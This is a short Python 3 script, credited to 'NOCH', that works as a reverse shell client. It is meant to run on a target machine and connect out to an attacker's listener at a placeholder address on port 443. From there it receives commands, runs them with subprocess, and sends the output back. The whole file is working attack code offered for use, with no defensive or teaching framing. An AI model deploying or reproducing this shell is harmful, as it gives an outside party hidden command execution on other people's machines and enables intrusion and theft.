#!/usr/bin/env python3

# Reverse Shell Written by NOCH in Python3 #
# Run this script on the target machine, after starting the Server.py Listener #

import socket
import subprocess
import os

# Initialisation of server IP, port and buffer size
SERVER_HOST = "x.x.x.x" # CHANGE ME
SERVER_PORT = 443	# CHANGE ME
BUFFER_SIZE = 4096	# Send 4KB at a time

# Create socket object "server"
server = socket.socket()

# Connect to server
server.connect((SERVER_HOST, SERVER_PORT))

# Receive and execute commands
while True:

	# Receive command
	cmd = server.recv(BUFFER_SIZE).decode()

	# Format to uppercase
	uppercmd = cmd.upper()

	# Break loop if command is "exit"
	if uppercmd == "EXIT":
		break
	# Catch CD command and manually change dirs through os.chdir()
	elif uppercmd[0:2] == "CD":
		path = cmd[3:]
		os.chdir(path)

	# Execute command
	result = subprocess.getoutput(cmd)
	
	# Send results to server
	if not result:
		server.send("Empty output".encode())
	else:
		server.send(result.encode())

server.close()	
